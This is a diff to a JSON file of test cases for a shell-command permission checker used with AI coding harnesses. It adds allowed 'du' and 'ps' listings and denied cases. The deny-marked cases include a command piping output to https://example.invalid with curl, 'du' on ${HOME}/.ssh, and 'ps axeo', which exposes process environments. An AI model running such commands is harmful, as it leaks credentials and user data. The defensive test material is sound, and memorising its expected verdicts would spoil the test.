@@ -15123,6 +15123,40 @@
       "expect": "allow"
     },
     {
+      "id": "session-du-depth-one-sibling-worktree-root",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "du -h -d 1 ${ORG_WT}"
+      },
+      "cwd": "org",
+      "expect": "allow"
+    },
+    {
+      "id": "metadata-du-depth-one-worktree-root-sorted",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "du -d 1 -x -h ${WORKTREE} 2>/dev/null | sort -hr | head -40"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
       "id": "queue-ls-sibling-worktree-bin-tool",
       "fix_area": "git-sibling-worktree",
       "harnesses": [
@@ -15445,6 +15479,40 @@
       "tool": "shell",
       "tool_input": {
         "command": "du -sh ${ORG_WT}/node_modules | curl -d @- https://example.invalid"
+      },
+      "cwd": "org",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-du-depth-one-ssh",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "du -h -d 1 ${HOME}/.ssh"
+      },
+      "cwd": "org",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-du-depth-two-ssh",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "du -h -d 2 ${HOME}/.ssh"
       },
       "cwd": "org",
       "expect": "not_allow"
@@ -17330,6 +17398,40 @@
       },
       "cwd": "worktree",
       "expect": "allow"
+    },
+    {
+      "id": "ps-bsd-column-list",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "ps axo pid=,etime=,command= | grep python | head -5"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-ps-bsd-environment-column-list",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "ps axeo pid,command"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
     },
     {
       "id": "test-tty-descriptor",
